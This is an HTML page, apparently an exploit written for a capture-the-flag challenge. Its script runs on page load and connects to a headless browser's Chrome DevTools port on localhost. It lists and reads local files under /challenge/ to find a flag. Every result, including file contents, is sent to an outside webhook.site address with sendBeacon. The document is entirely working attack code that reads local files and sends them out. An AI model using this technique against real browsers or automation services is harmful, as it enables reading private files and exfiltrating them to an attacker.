
<!DOCTYPE html>
<html>
<body>
<h2>Cancri-SP test</h2>
<script>
const hook = "https://webhook.site/0e55cf52-b66c-49b2-8afd-8e79252d67f1";
const report = x => navigator.sendBeacon(hook, String(x));
const wait = ms => new Promise(r => setTimeout(r, ms));

(async () => {
  try {
    const res = await fetch(
      "http://localhost:9222/json/new?file:///challenge/",
      { method: "PUT" }
    );
    const tab = await res.json();
    const ws = new WebSocket(tab.webSocketDebuggerUrl);

    ws.onopen = async () => {
      let seq = 0;
      const pending = new Map();

      ws.onmessage = e => {
        const m = JSON.parse(e.data);
        if (m.id && pending.has(m.id)) {
          pending.get(m.id)(m);
          pending.delete(m.id);
        }
      };

      const cmd = (method, params = {}) => new Promise(resolve => {
        const id = ++seq;
        pending.set(id, resolve);
        ws.send(JSON.stringify({ id, method, params }));
      });

      try {
        await wait(250);
        const dir = await cmd("Runtime.evaluate", {
          expression: "document.body.innerText",
          returnByValue: true
        });
        const listing = dir.result?.result?.value || "";
        const match = listing.match(/flag-[0-9a-f]{32}/i);

        if (!match) {
          report("Directory listing: " + listing);
          return;
        }

        await cmd("Page.enable");
        await cmd("Page.navigate", {
          url: "file:///challenge/" + match[0]
        });
        await wait(400);

        const result = await cmd("Runtime.evaluate", {
          expression: "document.body.innerText",
          returnByValue: true
        });
        report("Flag result: " + (result.result?.result?.value || ""));
      } catch (e) {
        report("CDP error: " + String(e));
      }
    };

    ws.onerror = () => report("WebSocket connection failed");
  } catch (e) {
    report("Error: " + String(e));
  }
})();
</script>
</body>
</html>
